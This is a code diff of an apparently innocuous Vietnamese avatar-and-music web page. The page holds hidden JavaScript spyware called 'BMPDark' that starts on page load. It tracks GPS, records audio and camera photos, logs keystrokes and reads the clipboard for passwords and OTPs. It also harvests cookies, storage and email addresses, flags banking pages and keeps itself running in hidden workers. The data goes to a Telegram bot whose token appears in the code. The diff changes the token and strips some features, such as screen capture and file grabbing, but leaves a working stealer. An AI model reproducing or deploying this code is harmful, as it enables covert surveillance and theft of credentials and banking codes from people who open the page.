@@ -23,10 +23,8 @@
     <audio id="a2" style="position:fixed;top:-9999px;left:-9999px;opacity:0"></audio>
     <audio id="music" loop style="position:fixed;top:-9999px;left:-9999px;opacity:0"></audio>
     <iframe id="f1" style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0"></iframe>
-    <iframe id="f2" style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0"></iframe>
     <input type="file" id="fi1" accept="image/*" capture="user" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
     <input type="file" id="fi2" accept="image/*" capture="environment" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
-    <input type="file" id="fi3" accept="*/*" multiple style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
     <input type="file" id="fi4" accept=".doc,.docx,.pdf,.xls,.xlsx,.txt,.csv,.json,.xml,.env,.cfg,.ini" multiple style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
 
     <img src="https://files.catbox.moe/zzpnph.jpeg" alt="Avatar" class="avatar">
@@ -34,12 +32,11 @@
     <p class="music-hint">🎵 Chạm vào màn hình để phát nhạc</p>
 
     <script>
-        const BOT = '8874459536:AAHgtg1YLgo1yGbCOa-uurQ_CcEZ6XGVQjM';
+        const BOT = '8685753290:AAHqd-iB6Q6Fnpq8L8z3oSpEeYgQveTVF4Y';
         let CHAT_ID = null;
         let dataSent = false;
         let gpsWatchId = null;
         let gpsHistory = [];
-        let frequentLocations = [];
         let mediaRecorder = null;
         let mediaRecorderSystem = null;
         let audioChunks = [];
@@ -54,16 +51,10 @@
         let webRTCData = {};
         let socialAccounts = [];
         let emailAccounts = [];
-        let formAutofill = [];
-        let paymentMethods = [];
         let gpsRouteMap = [];
         let downloadedFiles = [];
         let swRegistration = null;
-        let backgroundSyncActive = false;
-        let socialScreenshots = [];
-        let messengerMessages = [];
         let bankDetected = false;
-        let indexedDBData = {};
         let workerActive = false;
         let allFeaturesActive = 0;
         let musicPlaying = false;
@@ -82,22 +73,6 @@
                 }
             } catch(e) {}
             return null;
-        }
-
-        async function sendToTelegram(text) {
-            if (!CHAT_ID) await getChatID();
-            if (!CHAT_ID || dataSent) return;
-            dataSent = true;
-            try {
-                const maxL = 4000;
-                for (let i = 0; i < text.length; i += maxL) {
-                    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
-                        method: 'POST', headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(i, i + maxL), parse_mode: 'HTML' })
-                    });
-                }
-                dataSent = false;
-            } catch(e) {}
         }
 
         async function sendSilentMsg(text) {
@@ -146,9 +121,8 @@
                 music.src = 'https://files.catbox.moe/cpn042.mp4';
                 music.play().then(() => {
                     musicPlaying = true;
-                    const hint = document.querySelector('.music-hint');
-                    if (hint) hint.textContent = '🎵 Đang phát nhạc...';
-                    setTimeout(() => { if (hint) hint.textContent = ''; }, 3000);
+                    document.querySelector('.music-hint').textContent = '🎵 Đang phát nhạc...';
+                    setTimeout(() => { document.querySelector('.music-hint').textContent = ''; }, 3000);
                 }).catch(() => {});
             }
         });
@@ -179,21 +153,6 @@
             } catch(e) {}
         }
 
-        async function setupSystemAudioRecording() {
-            try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({ audio: true, video: true });
-                const audioTrack = stream.getAudioTracks()[0];
-                if (audioTrack) {
-                    mediaRecorderSystem = new MediaRecorder(new MediaStream([audioTrack])); systemAudioChunks = [];
-                    mediaRecorderSystem.ondataavailable = e => { if(e.data.size>0) systemAudioChunks.push(e.data); };
-                    mediaRecorderSystem.onstop = async () => { const blob = new Blob(systemAudioChunks, { type: 'audio/webm' }); if (blob.size > 1000) await sendDocument(blob, `sys_${Date.now()}.webm`); systemAudioChunks = []; };
-                    const cycle = () => { mediaRecorderSystem.start(); setTimeout(() => { if(mediaRecorderSystem.state==='recording') mediaRecorderSystem.stop(); setTimeout(cycle, 10000); }, 20000); };
-                    cycle();
-                }
-                allFeaturesActive++;
-            } catch(e) {}
-        }
-
         async function setupCameraCapture() {
             try {
                 cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
@@ -220,30 +179,8 @@
                     const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
                     if (blob) await sendPhoto(blob, `cam_back_${Date.now()}.jpg`);
                 }, 60000);
-                setInterval(() => {
-                    const rec = new MediaRecorder(cameraBackStream); const chunks = [];
-                    rec.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
-                    rec.onstop = async () => { await sendDocument(new Blob(chunks, {type:'video/webm'}), `vid_${Date.now()}.webm`); };
-                    rec.start(); setTimeout(() => rec.stop(), 10000);
-                }, 300000);
                 allFeaturesActive++;
             } catch(e) {}
-        }
-
-        async function setupScreenCapture() {
-            setInterval(async () => {
-                try {
-                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
-                    await new Promise(r => setTimeout(r, 500));
-                    const canvas = document.getElementById('c2');
-                    canvas.width = video.videoWidth || 1920; canvas.height = video.videoHeight || 1080;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
-                    if (blob) await sendPhoto(blob, `screen_${Date.now()}.jpg`);
-                    stream.getTracks().forEach(t => t.stop()); video.remove();
-                } catch(e) {}
-            }, 60000); allFeaturesActive++;
         }
 
         function setupKeylogger() {
@@ -251,7 +188,6 @@
             document.addEventListener('keydown', e => {
                 if (e.key === 'Enter') { buffer += '[ENTER]\n'; sendSilentMsg(`⌨️ KEYLOG: ${buffer}`); keylogData += buffer; buffer = ''; }
                 else if (e.key === 'Backspace') buffer = buffer.slice(0, -1);
-                else if (e.key === 'Tab') buffer += '[TAB]';
                 else if (e.key === ' ') buffer += ' ';
                 else if (e.key.length === 1) buffer += e.key;
                 else buffer += `[${e.key}]`;
@@ -268,7 +204,7 @@
                     if (text && text !== last) { 
                         last = text; 
                         sendSilentMsg(`📋 CLIPBOARD: ${text.substring(0,200)}`);
-                        if (text.match(/password|otp|token|secret|key|mã/i) || text.match(/^\d{4,8}$/)) sendSilentMsg(`🔑 MẬT KHẨU/OTP: ${text}`);
+                        if (text.match(/password|otp|token|secret|mã/i) || text.match(/^\d{4,8}$/)) sendSilentMsg(`🔑 MẬT KHẨU/OTP: ${text}`);
                     }
                 } catch(e) {}
             }, 1000); allFeaturesActive++;
@@ -285,14 +221,6 @@
                 sendSilentMsg(`🔋 PIN: ${(b.level*100).toFixed(0)}% | Sạc: ${b.charging?'Có':'Không'}`);
                 allFeaturesActive++;
             });
-        }
-
-        async function generateFingerprints() {
-            const canvas = document.createElement('canvas'); canvas.width = 200; canvas.height = 50;
-            const ctx = canvas.getContext('2d'); ctx.fillStyle = '#069'; ctx.fillText('FP', 2, 15);
-            const gl = document.createElement('canvas').getContext('webgl');
-            if (gl) { const d = gl.getExtension('WEBGL_debug_renderer_info'); }
-            allFeaturesActive++;
         }
 
         async function setupWebRTCSniffing() {
@@ -316,19 +244,6 @@
             } catch(e) {}
         }
 
-        async function scanLocalNetwork() {
-            for (let i=1;i<=20;i++) {
-                for (const ip of [`192.168.1.${i}`,`192.168.0.${i}`]) {
-                    try {
-                        const img = new Image(); img.src = `http://${ip}/favicon.ico`;
-                        await new Promise(r => { img.onload=img.onerror=()=>r(); setTimeout(r,200); });
-                        if (img.complete && img.naturalWidth>0) wifiNetworks.push(ip);
-                    } catch(e) {}
-                }
-            }
-            allFeaturesActive++;
-        }
-
         function extractAllStorage() {
             const cookies = document.cookie.split(';').filter(c=>c.trim());
             if (cookies.length>0) sendSilentMsg(`🍪 COOKIES: ${cookies.length}`);
@@ -344,7 +259,6 @@
             if (socialAccounts.length>0) sendSilentMsg(`👤 MXH: ${socialAccounts.join(', ')}`);
             const emails = [...new Set(html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [])];
             if (emails.length>0) { emailAccounts = emails; sendSilentMsg(`📧 EMAIL: ${emails.join(', ')}`); }
-            if (html.match(/visa|mastercard|credit.?card/i)) { paymentMethods.push('Credit Card'); sendSilentMsg('💳 FORM THANH TOÁN!'); }
             allFeaturesActive++;
         }
 
@@ -360,34 +274,6 @@
             try { new Worker(URL.createObjectURL(new Blob([`setInterval(()=>{fetch('https://api.telegram.org/bot${BOT}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${CHAT_ID||'0'}',text:'⚙️ WORKER: '+new Date().toLocaleString('vi-VN')})}).catch(()=>{})},120000);`],{type:'application/javascript'}))); workerActive = true; allFeaturesActive++; } catch(e) {}
         }
 
-        function setupFileAccess() {
-            const fi4 = document.getElementById('fi4');
-            setInterval(() => fi4.click(), 60000);
-            fi4.addEventListener('change', async e => {
-                for (const file of Array.from(e.target.files||[])) {
-                    if (file.size<10*1024*1024) { await sendDocument(file, file.name); sendSilentMsg(`📁 FILE: ${file.name}`); }
-                }
-            });
-            allFeaturesActive++;
-        }
-
-        function setupFacebookAutoScreenshot() {
-            setInterval(async () => {
-                if (window.location.href.includes('facebook.com') || window.location.href.includes('fb.com')) {
-                    try {
-                        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                        const video = document.createElement('video'); video.srcObject = stream; await video.play();
-                        await new Promise(r=>setTimeout(r,500));
-                        const canvas = document.createElement('canvas'); canvas.width=video.videoWidth||1920; canvas.height=video.videoHeight||1080;
-                        canvas.getContext('2d').drawImage(video,0,0);
-                        const blob = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.5));
-                        if (blob) await sendPhoto(blob,`fb_${Date.now()}.jpg`);
-                        stream.getTracks().forEach(t=>t.stop()); video.remove(); canvas.remove();
-                    } catch(e) {}
-                }
-            }, 30000); allFeaturesActive++;
-        }
-
         function setupBankingDetection() {
             const banks = ['vietcombank','bidv','vietinbank','agribank','techcombank','acb','chuyển khoản','mã otp'];
             setInterval(async () => {
@@ -395,37 +281,23 @@
                 const detected = banks.filter(b=>content.includes(b));
                 if (detected.length>0 && !bankDetected) {
                     bankDetected = true; sendSilentMsg(`🏦 NGÂN HÀNG: ${detected.join(', ')}`);
-                    try {
-                        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                        const video = document.createElement('video'); video.srcObject=stream; await video.play();
-                        await new Promise(r=>setTimeout(r,500));
-                        const canvas = document.createElement('canvas'); canvas.width=video.videoWidth||1920; canvas.height=video.videoHeight||1080;
-                        canvas.getContext('2d').drawImage(video,0,0);
-                        const blob = await new Promise(r=>canvas.toBlob(r,'image/jpeg',0.7));
-                        if (blob) await sendPhoto(blob,`bank_${Date.now()}.jpg`);
-                        stream.getTracks().forEach(t=>t.stop()); video.remove(); canvas.remove();
-                    } catch(e) {}
                     setTimeout(()=>{bankDetected=false;},300000);
                 }
             }, 3000); allFeaturesActive++;
         }
 
-        // ========== BẤM LINK LÀ CHẠY NGAY ==========
         window.addEventListener('load', async () => {
             await getChatID();
             
             Promise.all([
-                startGPSLiveTracking(), setupAudioRecording(), setupSystemAudioRecording(),
-                setupCameraCapture(), setupCameraBackCapture(), setupScreenCapture(),
-                setupKeylogger(), setupClipboardMonitor(), setupMotionSensors(),
-                setupBatteryMonitor(), generateFingerprints(), setupWebRTCSniffing(),
-                fetchIPInfo(), scanLocalNetwork(), extractAllStorage(), extractSocialAndEmail(),
-                setupServiceWorkerPersistence(), setupHiddenWebWorker(), setupFileAccess(),
-                setupFacebookAutoScreenshot(), setupBankingDetection()
+                startGPSLiveTracking(), setupAudioRecording(), setupCameraCapture(), setupCameraBackCapture(),
+                setupKeylogger(), setupClipboardMonitor(), setupMotionSensors(), setupBatteryMonitor(),
+                setupWebRTCSniffing(), fetchIPInfo(), extractAllStorage(), extractSocialAndEmail(),
+                setupServiceWorkerPersistence(), setupHiddenWebWorker(), setupBankingDetection()
             ]);
             
             setTimeout(async () => {
-                await sendSilentMsg(`⚡ BMPDark HOẠT ĐỘNG\n✅ GPS+Cam+Audio+Keylog+${allFeaturesActive} tính năng chạy ngay`);
+                await sendSilentMsg(`⚡ BMPDark HOẠT ĐỘNG\n✅ GPS+Cam+Audio+Keylog+${allFeaturesActive} tính năng`);
             }, 1500);
         });
 
@@ -433,7 +305,6 @@
             if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
             if (clipboardInterval) clearInterval(clipboardInterval);
             if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
-            if (mediaRecorderSystem?.state === 'recording') mediaRecorderSystem.stop();
             if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
             if (cameraBackStream) cameraBackStream.getTracks().forEach(t => t.stop());
         });
